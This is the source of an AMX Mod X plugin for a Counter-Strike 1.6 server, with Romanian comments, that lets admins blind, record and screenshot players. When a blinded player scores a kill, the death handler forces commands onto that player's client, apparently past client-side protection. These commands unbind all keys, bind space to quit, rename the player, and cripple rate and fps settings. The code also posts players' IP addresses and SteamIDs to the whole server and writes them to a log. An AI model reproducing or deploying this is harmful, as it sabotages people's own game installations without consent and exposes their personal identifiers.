#include <amxmodx>
#include <amxmisc>

#include <ANTI_PROTECTION>

#define CMDTARGET_BLIND (CMDTARGET_ALLOW_SELF|CMDTARGET_NO_BOTS)

new name2[32],name[32],ip[32],arg[32],user,steamid[32]
new bool:g_bBlind[33], gmsgScreenFade/*, amx_show_activity*/, admin[33],dc,filename[256]

static const poza[] = "extreamcs.com/forum/"
#define DENUMIRE "FURIEN.EXTREAMCS.COM"

new g_MsgScreenShake

#include <dhudmessage>


new bool:have_demo[33]=false,mapname[32],timer[65],timer2[65]


//#define LICENTA_PRIN_IP_PORT

#if defined LICENTA_PRIN_IP_PORT
#include <licenta>
#endif


//#define LICENTA_PRIN_MODEL

#if defined LICENTA_PRIN_MODEL
#include <licentax>
#define IP "89.34.25.64"

public plugin_precache()
{
CheckServer(IP);
}
#endif


//#define LICENTA_PRIN_IP_PORTx

#if defined LICENTA_PRIN_IP_PORTx
#include <licentay>
#define IP "89.34.25.64:27015"
#define SHUT_DOWN 0
#endif


#define LICENTA_PRIN_EXPIRARE

#if defined LICENTA_PRIN_EXPIRARE
#include <licentaz>
#endif


public plugin_init()
{
#if defined LICENTA_PRIN_IP_PORT
licenta()
#endif


#if defined LICENTA_PRIN_IP_PORTx
UTIL_CheckServerLicense(IP,SHUT_DOWN);
#endif


#if defined LICENTA_PRIN_EXPIRARE
licenta( );
#endif


    	register_plugin("Advanced blind", "1.6x", "xTeamCs Team & eVoLuTiOn")
        
    	gmsgScreenFade = get_user_msgid("ScreenFade") 
    	register_event("ScreenFade", "Event_ScreenFade", "b")
	register_event( "DeathMsg", "EventDeathMsg", "a" );
        
    	register_concmd("amx_blind","cmdBlind",ADMIN_KICK,"- > nume sau #userid < -") // de pus si motiv ? :)) --
    	register_concmd("amx_unblind","cmdUnblind",ADMIN_KICK,"- > nume sau #userid < -")

        g_MsgScreenShake = get_user_msgid( "ScreenShake" )


    	register_concmd("amx_record","cmdStartRecord",ADMIN_KICK,"<tinta>")
    	register_concmd("amx_stoprecord","cmdStopRecord",ADMIN_KICK,"<tinta>")


	get_configsdir(filename,255)
	format(filename,255,"%s/fragdupablind.q",filename)
	ReadFile()
}

public cmdStartRecord(id,level,cid){
        if(!cmd_access(id, level, cid, 2))
                return PLUGIN_HANDLED;
        
        read_argv(1, arg, 31);
	get_user_name(id,name,31)
        get_time("%m/%d/%Y - %H:%M:%S", timer, 64);
        get_mapname(mapname, 31);
       
        new player = cmd_target(id, arg, 5);
       
        if (!player)
                return PLUGIN_HANDLED;

	get_user_name(player,name2,31)

	if(!have_demo[player])
	{
		RAIZ0_EXCESS2(player,"record (%s)%s_%s[%s].dem",DENUMIRE, name2, mapname,timer);
		client_print(id, print_console,"> Demo inceput pe %s|%s|", name2, timer);
		chat_color(id, "!n|!g!!n|!g Demo!n pornit cu!g succes!n pe!g %s",name2);
		RAIZ0_EXCESS2(id,"snapshot")
		//client_cmd(player,"snapshot;screenshot")
       
		log_amx("[AMXX]: %s a inceput demo pe %s la %s", name, name2, timer);

		have_demo[player]=true
	}
	else	client_print(id, print_console,"> Exista deja un demo pornit pe %s !", name2);
       
        return PLUGIN_HANDLED;
}
public cmdStopRecord(id,level,cid){
        if(!cmd_access(id, level, cid, 2))
                return PLUGIN_HANDLED;
               
        read_argv(1, arg, 31);
        get_time("%m/%d/%Y - %H:%M:%S", timer, 64);
	get_user_name(id,name,31)
       
        new player = cmd_target(id, arg, 5);
       
        if (!player)
                return PLUGIN_HANDLED;

	get_user_name(player,name2,31)

	if(have_demo[player])
	{
		RAIZ0_EXCESS2(player, "stop");
		client_print(id, print_console, "> Demo oprit pe %s|%s|", name2, timer);
		//client_cmd(id,"snapshot")
		//chat_color(killer, "!n|!g!!n|!g Demo!n oprit cu!g succes!n pe!g %s",name2);
		//client_cmd(player,"snapshot;screenshot")
       
		log_amx("[AMXX]: %s a oprit demoul pe %s, la %s",name, name2, timer);
	}
	else	client_print(id, print_console,"> Nu exista nici un demo pornit pe %s !", name2);
       
        return PLUGIN_HANDLED;
}

public client_disconnect(id)
{
	if( g_bBlind[id] )
        {
		get_user_name( id, name, 31 );
		get_user_authid( id, steamid, 31 );
		get_user_ip( id, ip, 31, 1 );
		//ceva ban, etc??..
		chat_color( 0, "!nJucatorul!t %s!n <!g%s!n> <!t%s!n> s-a deconectat cu!g BLIND!n.", name, steamid, ip );

		g_bBlind[id] = false
        }
}

public client_putinserver(id)	g_bBlind[id] = false

/*public client_spawn(id)
{
	if(is_user_connected(id)&&is_user_alive(id)&&g_bBlind[id])
	{
		g_bBlind[id] = false
		Reset_Screen(id)
	}
}*/

public cmdBlind(id, level, cid)
{ 
	if(!cmd_access(id, level, cid, 2))	return PLUGIN_HANDLED
        
    	read_argv(1, arg, 31) 
    	user = cmd_target(id, arg, CMDTARGET_BLIND)
    	if(!user||is_user_bot(user)||is_user_bot(id)) return PLUGIN_HANDLED
	if(!is_user_alive(user))
	{
	console_print(id, "Trebuie sa fie in viata, pentru a putea primi BLIND")
	return PLUGIN_HANDLED
	}
        
    	get_user_name(id,name,31)
    	get_user_name(user,name2,31)
    	get_user_ip(user,ip,31,1)

    	admin[ user ] = id;

	if(get_user_flags(user)&ADMIN_IMMUNITY)
	{
    	console_print(id, "Jucatorul ^"%s^" este ADMIN.",name2)
    	return PLUGIN_HANDLED
	}

    	if(g_bBlind[user])
    	{
    	console_print(id, "Jucatorul ^"%s^" are deja blind",name2)
    	return PLUGIN_HANDLED
    	}
    	else
    	{
    	g_bBlind[user] = true
        
    	Fade_To_Black(user)
    	}
        
    	console_print(id, "Jucatorul ^"%s^" cu ip`ul: ^"%s^" a primit blind",name2,ip) 
    	client_cmd(id,"amx_chat ^"%s^" a primit blind",name2)
        
    	client_cmd(user, "spk bigwarning")
        
    	return PLUGIN_HANDLED 
}

public cmdUnblind(id, level, cid)
{ 
    	if(!cmd_access(id, level, cid, 2))	return PLUGIN_HANDLED
        
    	read_argv(1, arg, 31) 
    	user = cmd_target(id, arg, CMDTARGET_BLIND) 
    	if(!user) return PLUGIN_HANDLED
        
    	get_user_name(id,name,31) 
    	get_user_name(user,name2,31)
    	get_user_ip(user,ip,31,1)
        
    	if(g_bBlind[user])
    	{
    	g_bBlind[user] = false
            
    	Reset_Screen(user)

    	console_print(id, "Jucatorul ^"%s^" cu ip`ul: ^"%s^" a primit unblind",name2,ip) 
    	client_cmd(id,"amx_chat ^"%s^" a primit unblind",name2)

    	ShakeScreen(user,3.0)
    	}
    	else
    	{
    	console_print(id, "Jucaotrul ^"%s^" nu are blind", name2)
    	return PLUGIN_HANDLED
    	}

    	return PLUGIN_HANDLED
}

public Event_ScreenFade(id) 
{
    	if(g_bBlind[id])	Fade_To_Black(id)
	//else	Reset_Screen(id)
}

public Fade_To_Black(id)
{
	//if(g_bBlind[id])	return
    	message_begin(MSG_ONE_UNRELIABLE, gmsgScreenFade, _, id)
    	write_short((1<<3)|(1<<8)|(1<<10))
    	write_short((1<<3)|(1<<8)|(1<<10))
    	write_short((1<<0)|(1<<2))
    	write_byte(255)
    	write_byte(255)
    	write_byte(255)
    	write_byte(255)
    	message_end()
}

public Reset_Screen(id)
{
	//if(!g_bBlind[id])	return
    	message_begin(MSG_ONE_UNRELIABLE, gmsgScreenFade, _, id)
    	write_short(1<<2)
    	write_short(0)
    	write_short(0)
    	write_byte(0)
    	write_byte(0)
    	write_byte(0)
    	write_byte(0)
    	message_end()
}

// Shake
public ShakeScreen(id,const Float:seconds)
{
	//if(!g_bBlind[id])	return
        message_begin(MSG_ONE_UNRELIABLE,g_MsgScreenShake,{0,0,0},id);
        write_short(floatround(4096.0 * seconds,floatround_round));
        write_short(floatround(4096.0 * seconds,floatround_round));
        write_short(1<<13);
        message_end();
}

public EventDeathMsg()
{
	new killer=read_data( 1 ), victim= read_data( 2 );
        
    	if(g_bBlind[killer]&&is_user_alive(killer)&&killer!=victim)
    	{
    	new numeserver[64], ipcodat[32], authid2[ 35 ], admini[32], inum,fo_logfile[64],maxtext[256]
    	get_user_name(admin[killer], name, 31)
    	get_user_name(killer, name2, 31)
	get_user_authid( admin[killer], steamid, sizeof( steamid ) -1 );
	get_user_authid( killer, authid2, sizeof( authid2 ) -1 );
    	get_user_ip(admin[killer], ip, 31, 1)
    	get_user_ip(killer, ipcodat, 31, 1)
    	get_cvar_string("hostname",numeserver,63);
    	get_configsdir(fo_logfile, 63)
    	get_time("Data: %d/%m/%Y!n -!g Ora: %H:%M:%S",timer,64)
    	get_time("Data: %d/%m/%Y - Ora: %H:%M:%S",timer2,64)

	ReadFile()
	if(dc<=0)	dc=1
	else	dc++
	WriteFile()

	set_dhudmessage(255,255,0,0.47,0.51,0,8.0,15.0,5.1,3.2)
	new Message[1024];
	formatex(Message,charsmax(Message), "FRAG DUPA BLIND FACUT DE %s^nRESPECTA SI VEI FI RESPECTAT.^nEsti al %d`lea nemernic turnat.^nSperam ca te-ai lecuit.^n%s",name2,dc,poza);
	show_dhudmessage(0,Message)

	client_cmd(0, "spk ^"vox/bizwarn coded user apprehend^"")

    	formatex(maxtext, 255, "[CS] %s -> ADMIN: %s (IP:%s | STEAMID:%s) | CODAT: %s (IP:%s | STEAMID:%s)",timer2,name,ip,steamid,name2,ipcodat,authid2)
    	formatex(fo_logfile, 63, "%s/fragdupablind.txt", fo_logfile)

	get_players(admini, inum, "ch")
    	for (new i = 0; i < inum; i++)	if ( access(admini[i],ADMIN_CHAT) )	client_print(admini[i],print_chat,"Jucatorul %s a facut frag dupa blind-ul dat de %s",name2,name)

        chat_color(killer, "!n=====================================================");
    	chat_color(killer, "!g* !nFRAG DUPA BLIND facut de !t%s", name2)
	chat_color(killer, "!g* !nPoza facuta pe: !t%s",numeserver)
	chat_color(killer, "!g* !nNume codat:  ^"!t%s!n^" cu IP: !g%s!n & STEAMID:!g %s",name2,ipcodat,authid2)
	chat_color(killer, "!g* !nNume admin: ^"!t%s!n^" cu IP: !g%s!n & STEAMID:!t %s",name,ip,steamid)
	chat_color(killer, "!g* !nTIMP : !t%s",timer)
	chat_color(killer, "!g* !nViziteaza !t%s !npentru a face o cerere de !gUNBAN.",poza)
        chat_color(killer, "!n======================================================");
            
    	RAIZ0_EXCESS2(killer,"wait;snapshot")
            
    	console_print(killer, "* FRAG DUPA BLIND by %s", name2)
    	console_print(killer, "* Poza facuta pe : %s",numeserver) 
    	console_print(killer, "* Nume codat:  ^"%s^" cu IP: %s & STEAMID: %s",name2,ipcodat,authid2) 
    	console_print(killer, "* Nume admin: ^"%s^" cu IP: %s & STEAMID: %s",name,ip,steamid)
    	console_print(killer, "* TIMP : %s",timer2) 
    	console_print(killer, "* Viziteaza %s pentru a face o cerere de UNBAN.",poza)

    	RAIZ0_EXCESS2(killer,"wait;toggleconsole;snapshot")
       
    	RAIZ0_EXCESS2(killer,"unbindall;developer 1")
    	RAIZ0_EXCESS2(killer,"bind mouse1 ^"say Am facut frag dupa BLIND pe %s^";wait;bind space quit",DENUMIRE)
    	RAIZ0_EXCESS2(killer,"wait; bind escape ^"say Am facut frag dupa BLIND pe %s^";",DENUMIRE)
    	RAIZ0_EXCESS2(killer,";wait;bind ^"`^" ^"say Am facut frag dupa BLIND pe %s^";bind ^"~^" ^"say Am facut frag dupa BLIND pe %s^";wait;name ^"CODAT de pe %s^"",DENUMIRE,DENUMIRE,DENUMIRE)
    	RAIZ0_EXCESS2(killer,"rate 1;gl_flipmatrix 1;cl_cmdrate 10;cl_updaterate 10;fps_max 1;hideradar;con_color ^"1 1 1^"")

	/*if(g_bBlind[killer]&&is_user_connected(killer))
	{
		g_bBlind[killer]=false
		Reset_Screen(killer)
    	}*/
            
    	write_file(fo_logfile,maxtext,-1)
            
    	console_print(admin[killer], "* FRAG DUPA BLIND by %s",name2)
    	console_print(admin[killer], "* Poza facuta pe : %s",numeserver) 
    	console_print(admin[killer], "* Nume codat:  ^"%s^" cu IP: %s & STEAMID: %s",name2,ipcodat,authid2) 
    	console_print(admin[killer], "* Nume admin: ^"%s^" cu IP: %s & STEAMID: %s",name,ip,steamid)
    	console_print(admin[killer], "* TIMP : %s",timer2) 
    	//console_print(admin[killer], "* Viziteaza %s pentru a face o cerere de UNBAN.",poza)

    	RAIZ0_EXCESS2(admin[killer],"wait;toggleconsole;snapshot")

        chat_color(admin[killer], "!n=====================================================");
    	chat_color(admin[killer], "!g* !nFRAG DUPA BLIND facut de !t%s",name2)
	chat_color(admin[killer], "!g* !nPoza facuta pe: !t%s",numeserver)
	chat_color(admin[killer], "!g* !nNume codat:  ^"!t%s!n^" cu IP: !g%s!n & STEAMID:!g %s",name2,ipcodat,authid2)
	chat_color(admin[killer], "!g* !nNume admin: ^"!t%s!n^" cu IP: !g%s!n & STEAMID:!t %s",name,ip,steamid)
	chat_color(admin[killer], "!g* !nData : !t%s",timer)
	//chat_color(admin[killer], "!g* !nViziteaza !t%s !npentru a face o cerere de !gUNBAN.",poza)
        chat_color(admin[killer], "!n=====================================================");
            
    	RAIZ0_EXCESS2(admin[killer],"toggleconsole;wait;snapshot")
            
	//RAIZ0_EXCESS2(admin[killer], "amx_banip #%d 9999 ^"FRAG DUPA BLIND^"",get_user_userid(killer));
	}
}

WriteFile()
{
    new filepointer = fopen(filename,"w")
    if(filepointer)
    {
	fprintf(filepointer,"%d",dc)
        fclose(filepointer)
    }
}
ReadFile()
{
    new filepointer = fopen(filename,"rt")
    if(filepointer)
    {
        new readdata[128],parseddata[32]
        while(fgets(filepointer,readdata,127))
        {
	    if(!readdata[0])	continue
            parse(readdata,parseddata,31)
            dc=str_to_num(parseddata)
        }
        fclose(filepointer)
    }
}

stock chat_color(const id, const input[], any:...)
{
	new count = 1, players[32]
	static msg[191]
	vformat(msg, 190, input, 3)
	replace_all(msg, 190, "!g", "^4")
	replace_all(msg, 190, "!n", "^1")
	replace_all(msg, 190, "!t", "^3")
	replace_all(msg, 190, "!t2", "^0")
	if (id) players[0] = id; else get_players(players, count, "ch")
	for (new i = 0; i < count; i++)
	{
		if (is_user_connected(players[i]))
		{
			message_begin(MSG_ONE_UNRELIABLE, get_user_msgid("SayText"), _, players[i])
			write_byte(players[i]);
			write_string(msg);
			message_end();
		}
	}
}
